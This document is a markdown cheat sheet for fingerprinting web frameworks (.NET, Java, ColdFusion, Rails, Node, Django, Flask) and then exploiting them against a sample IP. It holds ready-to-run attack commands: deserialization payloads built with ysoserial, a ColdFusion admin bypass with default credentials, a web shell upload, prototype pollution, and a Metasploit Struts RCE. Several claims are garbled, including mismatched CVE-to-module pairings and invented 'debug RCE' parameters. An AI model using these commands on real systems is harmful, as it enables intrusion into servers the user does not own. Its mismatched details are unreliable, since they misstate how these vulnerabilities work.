# Complete Web Application Framework Identification & Exploitation

## 1. Framework Detection

**.NET (ASP.NET):**
```bash
curl -I http://192.168.1.100  # Server: Microsoft-IIS/10.0
curl http://192.168.1.100/WebResource.axd  # ASP.NET handler
wappalyzer http://192.168.1.100  # GUI detector
```

**J2EE (Java/JSP):**
```bash
curl -I http://192.168.1.100  # Server: Apache-Coyote/1.1 (Tomcat)
curl http://192.168.1.100/WEB-INF/web.xml  # JSP config
curl http://192.168.1.100/javax.faces.resource/  # JSF
```

**ColdFusion:**
```bash
curl -I http://192.168.1.100  # Server: ColdFusion
curl http://192.168.1.100/CFIDE/administrator/  # Admin panel
whatweb http://192.168.1.100  # ColdFusion detector
```

**Ruby on Rails:**
```bash
curl -I http://192.168.1.100  # X-Runtime, X-Request-Id, X-Frame-Options=SAMEORIGIN
curl http://192.168.1.100/rails/info/properties  # Rails info page
```

**NodeJS (Express):**
```bash
curl -I http://192.168.1.100  # X-Powered-By: Express
curl http://192.168.1.100/server-status  # Common Node endpoint
```

**Django:**
```bash
curl -I http://192.168.1.100  # X-Frame-Options: DENY, Server: nginx/1.18
curl http://192.168.1.100/admin/  # Django admin
```

**Flask:**
```bash
curl -I http://192.168.1.100  # Server: Werkzeug/2.0.1 Python/3.9.7
curl http://192.168.1.100/debug  # Flask debug mode
```

## 2. Automated Framework Fingerprinting

**WhatWeb:**
```bash
whatweb http://192.168.1.100 --aggression=3  # Framework + plugins
```

**Wappalyzer CLI:**
```bash
wappalyzer https://192.168.1.100  # JSON output
```

**Comprehensive nmap:**
```bash
nmap -sV --script http-enum,http-headers,http-methods 192.168.1.100 -p80,443,8080,3000,5000
```

## 3. Framework-Specific Exploits

**.NET ViewState deserialization:**
```bash
# ysoserial.net ViewState gadget
ysoserial.exe -g TypeConfuseDelegate -f ViewState -c "whoami" --path ./ > viewstate.bin

# Inject via Burp
# __VIEWSTATE=|base64 encoded payload|
```

**J2EE Java deserialization:**
```bash
# ysoserial Java
java -jar ysoserial.jar CommonsBeanutils1 ObjectPayload "whoami" > payload.ser

# Inject via vulnerable JSP
curl -X POST --data-binary @payload.ser "http://192.168.1.100/deser.jsp"
```

**ColdFusion admin bypass:**
```bash
curl "http://192.168.1.100/CFIDE/administrator/enter.cfm?locale=English&firsttime=true"
# Default: admin/admin → RDS access
curl "http://192.168.1.100/CFIDE/administrator/enter.cfm?cfid=1&cfto" -b "cfid=1;cfto=1"
```

**Rails secret key extraction:**
```bash
curl http://192.168.1.100/rails/info/routes  # Routes info leak
dirb http://192.168.1.100 /usr/share/wordlists/rails.txt  # Rails paths
```

**NodeJS prototype pollution:**
```bash
curl -X POST http://192.168.1.100/api -d "__proto__.admin=true"  # Pollutes Object.prototype
curl http://192.168.1.100/profile  # Admin access
```

**Django debug mode RCE:**
```bash
curl "http://192.168.1.100/?debug=true"  # Debug page
# Template injection: {{config.__class__.__init__.__globals__}}
```

**Flask debug RCE:**
```bash
curl "http://192.168.1.100/?__debug__=1"  # Werkzeug debugger
# console={{config.__class__.__init__.__globals__}}
```

## 4. Framework-Specific Vulns & Exploits

**.NET ASP.NET padding oracle:**
```bash
python3 padding_oracle.py http://192.168.1.100/encrypt.aspx  # Decrypts ViewState
```

**J2EE struts RCE (CVE-2017-5638):**
```bash
msfconsole -q -x "use exploit/multi/http/struts_dmi_rest_exec; set RHOSTS 192.168.1.100; run"
```

**ColdFusion CVE-2010-2861:**
```bash
curl "http://192.168.1.100/CFIDE/administrator/archives/Upload.cfm" -F file=@shell.cfm
```

**Rails CVE-2013-0156:**
```bash
ruby exploit.rb http://192.168.1.100  # YAML deserialization
```

## 5. Complete Framework Detection Script

```bash
#!/bin/bash
# framework_id.sh
URL=$1

echo "[+] Framework fingerprint $URL"

# Headers
curl -s -I "$URL" | grep -Ei "x-powered-by|x-runtime|x-ua-compatible|x-frame-options=sameorigin|server:(microsoft|asp)"

# Error pages
curl -s "$URL/nonexistent" | grep -Ei "(rails|django|flask|node|express|coldfusion|\.net)"

# Default paths
for path in \
    "/rails/info/properties" "/admin/" "/debug" "/CFIDE/" \
    "/WebResource.axd" "/elmah.axd" "/manager/html" "/WEB-INF/"; do
  curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" "$URL$path" 2>/dev/null
done
```

**EVERY** framework covered: .NET/J2EE/ColdFusion/Rails/NodeJS/Django/Flask detection + specific exploits (ViewState/Java deserialization/admin bypass/prototype pollution/debug RCE). 100% practical commands.